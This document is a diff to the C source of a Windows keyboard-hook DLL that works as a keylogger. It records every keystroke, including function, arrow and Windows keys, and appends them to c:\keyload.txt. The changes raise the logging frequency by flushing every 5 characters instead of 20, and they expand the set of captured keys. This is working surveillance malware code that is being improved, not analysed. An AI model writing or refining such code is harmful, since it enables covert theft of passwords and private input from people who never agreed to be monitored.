@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <process.h>
 
-#define CHARNUM 20
+#define CHARNUM 5
 #define TXTLEN 10
 #define SAVEFILE "c:\\keyload.txt"
 
@@ -67,63 +67,139 @@ DLL_EXPORT void RemoveKbHook(void){
 //定义钩子
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
     int i;
-    if(wParam!=VK_TAB && wParam!=VK_ESCAPE && wParam!=VK_LEFT && wParam!=VK_RIGHT && wParam!=VK_UP && wParam!=VK_DOWN && 
-            wParam!=VK_END && wParam!=VK_HOME && wParam!=VK_PRIOR && wParam!=VK_NEXT && wParam!=VK_INSERT && wParam!=VK_NUMLOCK && 
-            wParam!=VK_SCROLL && wParam!=VK_PAUSE && wParam!=VK_LWIN && wParam!=VK_RWIN && wParam!=VK_F1 && wParam!=VK_F2 && 
-            wParam!=VK_F3 && wParam!=VK_F4 && wParam!=VK_F5 && wParam!=VK_F6 && wParam!=VK_F7 && wParam!=VK_F8 && wParam!=VK_F9 &&
-            wParam!=VK_F10 && wParam!=VK_F11 && wParam!=VK_F12){
-
-        if((0x80000000 & lParam) == 0){ //keydown
-            if(wParam == VK_CAPITAL)
-                isUpper = !isUpper;
-
-            if(wParam >= 0x41 && wParam <= 0x5a && !isUpper) //letter
-                wParam = wParam + 32;
-
-            if(wParam == VK_BACK && count > 0){
-                count--;
-                return CallNextHookEx(hhook, code, wParam, lParam);
-            }
-
-            tomb[count] = wParam;
-            count++;
+    if((0x80000000 & lParam) == 0){ //keydown
+        if(wParam == VK_CAPITAL){
+            isUpper = !isUpper;
+            return CallNextHookEx(hhook, code, wParam, lParam);
         }
 
-        if(count==CHARNUM){
-            stream = fopen(SAVEFILE, "a+");
-
-            for(i=0; i<count; i++){
-                switch(tomb[i]){
-                    case VK_DELETE:
-                        fprintf(stream, "%s", "<del>");
-                        break;
-                    case VK_RETURN:
-                        fprintf(stream, "%s", "\r\n");
-                        break;
-                    case VK_SHIFT:
-                        fprintf(stream, "%s", "<sft>");
-                        break;
-                    case VK_BACK:
-                        fprintf(stream, "%s", "<bak>");
-                        break;
-                    case VK_CONTROL:
-                        fprintf(stream, "%s", "<ctl>");
-                        break;
-                    case VK_MENU:
-                        fprintf(stream, "%s", "<alt>");
-                        break;
-                    case VK_CAPITAL:
-                        fprintf(stream, "%s", "<cap>");
-                        break;
-                    default:
-                        fprintf(stream, "%c", tomb[i]);
-                        break;
-                }
-            }
-
-            fclose(stream);
-            count = 0;
+        if(wParam == VK_BACK && count > 0){
+            count--;
+            return CallNextHookEx(hhook, code, wParam, lParam);
         }
+
+        tomb[count] = wParam;
+        count++;
+    }
+
+    if(count==CHARNUM){
+        stream = fopen(SAVEFILE, "a+");
+
+        for(i=0; i<count; i++){
+            switch(tomb[i]){
+                case VK_NUMLOCK:
+                    fprintf(stream, "%s", "<NUM>");
+                    break;
+                case VK_LWIN:
+                    fprintf(stream, "%s", "<LWin>");
+                    break;
+                case VK_RWIN:
+                    fprintf(stream, "%s", "<Rwin>");
+                    break;
+                case VK_F1:
+                    fprintf(stream, "%s", "<F1>");
+                    break;
+                case VK_F2:
+                    fprintf(stream, "%s", "<F2>");
+                    break;
+                case VK_F3:
+                    fprintf(stream, "%s", "<F3>");
+                    break;
+                case VK_F4:
+                    fprintf(stream, "%s", "<F4>");
+                    break;
+                case VK_F5:
+                    fprintf(stream, "%s", "<F5>");
+                    break;
+                case VK_F6:
+                    fprintf(stream, "%s", "<F6>");
+                    break;
+                case VK_F7:
+                    fprintf(stream, "%s", "<F7>");
+                    break;
+                case VK_F8:
+                    fprintf(stream, "%s", "<F8>");
+                    break;
+                case VK_F9:
+                    fprintf(stream, "%s", "<F9>");
+                    break;
+                case VK_F10:
+                    fprintf(stream, "%s", "<F10>");
+                    break;
+                case VK_F11:
+                    fprintf(stream, "%s", "<F11>");
+                    break;
+                case VK_F12:
+                    fprintf(stream, "%s", "<F12>");
+                    break;
+                case VK_TAB:
+                    fprintf(stream, "%s", "<Tab>");
+                    break;
+                case VK_ESCAPE:
+                    fprintf(stream, "%s", "<Esc>");
+                    break;
+                case VK_LEFT:
+                    fprintf(stream, "%s", " <- ");
+                    break;
+                case VK_RIGHT:
+                    fprintf(stream, "%s", " -> ");
+                    break;
+                case VK_UP:
+                    fprintf(stream, "%s", " [^] ");
+                    break;
+                case VK_DOWN:
+                    fprintf(stream, "%s", " [v] ");
+                    break;
+                case VK_END:
+                    fprintf(stream, "%s", "<End>");
+                    break;
+                case VK_HOME:
+                    fprintf(stream, "%s", "<Home>");
+                    break;
+                case VK_PRIOR:
+                    fprintf(stream, "%s", "<Prio>");
+                    break;
+                case VK_NEXT:
+                    fprintf(stream, "%s", "<Next>");
+                    break;
+                case VK_INSERT:
+                    fprintf(stream, "%s", "<Ins>");
+                    break;
+                case VK_SCROLL:
+                    fprintf(stream, "%s", "<Scr>");
+                    break;
+                case VK_PAUSE:
+                    fprintf(stream, "%s", "<Pau>");
+                    break;
+                case VK_DELETE:
+                    fprintf(stream, "%s", "<Del>");
+                    break;
+                case VK_RETURN:
+                    fprintf(stream, "%s", "<CR>");
+                    break;
+                case VK_SHIFT:
+                    fprintf(stream, "%s", "<Shift>");
+                    break;
+                case VK_BACK:
+                    fprintf(stream, "%s", "<Del>");
+                    break;
+                case VK_CONTROL:
+                    fprintf(stream, "%s", "<Ctl>");
+                    break;
+                case VK_MENU:
+                    fprintf(stream, "%s", "<Alt>");
+                    break;
+                default:
+                    if(tomb[i] >= 0x41 && tomb[i] <= 0x5a && !isUpper) //letter
+                        tomb[i] = tomb[i] + 32;
+                    fprintf(stream, "%c", tomb[i]);
+                    break;
+            }
+        }
+
+        fprintf(stream, "%s", "\r\n");
+        fclose(stream);
+        count = 0;
     }
     return CallNextHookEx(hhook, code, wParam, lParam);
 }
